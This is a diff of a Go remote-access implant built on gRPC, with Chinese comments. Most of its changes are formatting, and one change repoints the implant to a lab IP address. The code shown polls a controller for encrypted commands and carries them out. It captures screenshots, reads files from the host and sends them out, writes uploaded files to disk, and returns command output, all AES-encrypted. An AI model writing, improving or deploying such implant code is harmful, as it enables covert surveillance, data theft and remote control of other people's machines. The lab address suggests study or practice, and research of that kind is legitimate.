@@ -13,18 +13,18 @@ import (
 	"time"
 )
 
-func main()  {
+func main() {
 	var (
-		opts []grpc.DialOption
-		conn *grpc.ClientConn
-		err error
+		opts   []grpc.DialOption
+		conn   *grpc.ClientConn
+		err    error
 		client grpcapi.ImplantClient
 	)
 	opts = append(opts, grpc.WithInsecure())
-	opts = append(opts, grpc.WithDefaultCallOptions(grpc.MaxCallRecvMsgSize(1024 * 1024 * 12 )))
-	opts = append(opts, grpc.WithDefaultCallOptions(grpc.MaxCallSendMsgSize(1024 * 1024 * 12)))
+	opts = append(opts, grpc.WithDefaultCallOptions(grpc.MaxCallRecvMsgSize(1024*1024*12)))
+	opts = append(opts, grpc.WithDefaultCallOptions(grpc.MaxCallSendMsgSize(1024*1024*12)))
 
-	if conn,err = grpc.Dial(fmt.Sprintf("0.0.0.0:%d",1961), opts...); err != nil {
+	if conn, err = grpc.Dial(fmt.Sprintf("192.168.56.132:%d", 1961), opts...); err != nil {
 		log.Fatal(err)
 	}
 	defer conn.Close()
@@ -38,9 +38,9 @@ func main()  {
 			log.Fatal(err)
 		}
 		if cmd.In == "" {
-			t,_ := client.GetSleepTime(ctx,req)
-			fmt.Println("sleep"+t.String())
-			time.Sleep(time.Duration(t.Time)* time.Second)
+			t, _ := client.GetSleepTime(ctx, req)
+			fmt.Println("sleep" + t.String())
+			time.Sleep(time.Duration(t.Time) * time.Second)
 			continue
 		}
 		//从服务端获取到命令后先进行解密处理
@@ -50,8 +50,8 @@ func main()  {
 		//输入的命令为screenshot 就进入下面的流程
 		if tokens[0] == "screenshot" {
 			images := util.Screenshot()
-			for _,image := range images {
-				result,_ := util.EncryptByAes(util.ImageToByte(image))
+			for _, image := range images {
+				result, _ := util.EncryptByAes(util.ImageToByte(image))
 				cmd.Out += result
 				cmd.Out += ";"
 			}
@@ -61,13 +61,13 @@ func main()  {
 		//匹配上传命令
 		if tokens[0] == "upload" {
 			//fmt.Println(cmd.Out)
-			file,_ := util.DecryptByAes(cmd.Out)
-			err := os.WriteFile(tokens[2],file,0666)
-			if err != nil{
-				cmd.Out,_ = util.EncryptByAes([]byte(err.Error()))
+			file, _ := util.DecryptByAes(cmd.Out)
+			err := os.WriteFile(tokens[2], file, 0666)
+			if err != nil {
+				cmd.Out, _ = util.EncryptByAes([]byte(err.Error()))
 				client.SendOutput(ctx, cmd)
 			} else {
-				cmd.Out,_ = util.EncryptByAes([]byte("upload success!"))
+				cmd.Out, _ = util.EncryptByAes([]byte("upload success!"))
 				client.SendOutput(ctx, cmd)
 			}
 
@@ -75,13 +75,13 @@ func main()  {
 		}
 		//匹配下载命令
 		if tokens[0] == "download" {
-			file,err := os.ReadFile(tokens[1])
+			file, err := os.ReadFile(tokens[1])
 			if err != nil {
-				cmd.Out,_ = util.EncryptByAes([]byte("download err! "+err.Error()))
+				cmd.Out, _ = util.EncryptByAes([]byte("download err! " + err.Error()))
 				client.SendOutput(ctx, cmd)
-			}else {
-				cmd.Out,_ = util.EncryptByAes(file)
-				_,err2 := client.SendOutput(ctx, cmd)
+			} else {
+				cmd.Out, _ = util.EncryptByAes(file)
+				_, err2 := client.SendOutput(ctx, cmd)
 				if err2 != nil {
 					fmt.Println(err2.Error())
 				}
@@ -100,14 +100,13 @@ func main()  {
 		if err != nil {
 			//报错进行加密
 
-			cmd.Out =  err.Error()
+			cmd.Out = err.Error()
 
 		}
 		//将结果发送给服务端时先进行加密处理
 		cmd.Out += string(buf)
-		cmd.Out,_ = util.EncryptByAes([]byte(cmd.Out))
-		fmt.Println(cmd.In+cmd.Out)
+		cmd.Out, _ = util.EncryptByAes([]byte(cmd.Out))
+		fmt.Println(cmd.In + cmd.Out)
 		client.SendOutput(ctx, cmd)
 	}
 }
-
